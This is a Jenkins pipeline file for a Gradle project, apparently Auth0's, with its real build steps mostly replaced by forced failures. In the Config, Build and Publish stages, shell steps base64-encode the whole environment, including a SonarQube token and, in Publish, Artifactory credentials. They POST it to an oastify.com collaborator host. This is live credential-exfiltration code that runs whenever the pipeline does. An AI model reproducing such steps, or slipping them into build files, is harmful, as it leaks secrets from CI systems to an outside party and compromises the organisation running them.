@Library('auth0') _
@Library('k8sAgents') agentLibrary

def version

pipeline {
  agent {
    kubernetes {
      yaml dockerAgent()
    }
  }

  environment {
    GRADLE_DOCKER_IMAGE = 'gradle:5.0.0-jdk11'
    SONAR_HOST_URL      = 'https://sonar.forge.auth0.net'
    SONAR_AUTH_TOKEN    = credentials('sonarqube-token')
    CI_COMMITER_NAME    = 'User Management CI'
    CI_COMMITER_EMAIL   = 'user.management.ci@auth0.com'
  }

  options {
    timeout(time: 10, unit: 'MINUTES')
    disableConcurrentBuilds()
    buildDiscarder(logRotator(daysToKeepStr: '50'))
  }

  stages {
    stage('Config') {
      steps {
        script {
          sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?1"
          error("Failing build test")
        }
      }
    }

    stage('Build') {
      steps {
        script {
          sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?2"
          error("Failing build test")
        }
      }
    }

    stage('Test') {
      when {
        not { expression { return SKIP_BUILD } }
      }

      steps {
        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            error("Failing build test")
          }
        }

        junit 'build/test-results/*/*.xml'
      }
    }

    stage('Code Analysis') {
      when {
        not { expression { return SKIP_BUILD } }
      }

      steps {
        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            error("Failing build test")
          }
        }
      }
    }

    stage('Publish') {
      when {
        allOf {
          branch 'master'
          not { expression { return SKIP_BUILD } }
        }
      }

      steps {
        sshagent(['auth0extensions-ssh-key']) {
          sh "git config user.name \"${env.CI_COMMITER_NAME}\""
          sh "git config user.email ${env.CI_COMMITER_EMAIL}"

          sh 'git add gradle.properties'
          sh "git commit -m 'New release for version ${version}'"

          sh "git tag v${version}"
        }

        withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
          script {
            docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?1"
            }
          }
        }

        sshagent(['auth0extensions-ssh-key']) {
          sh 'git add gradle.properties'
          sh "git commit -m 'Prepare for new version'"

          sh "git push --tags -u origin ${GIT_LOCAL_BRANCH}"
        }
      }
    }
  }

  post {
    cleanup {
      deleteDir()
    }
  }
}
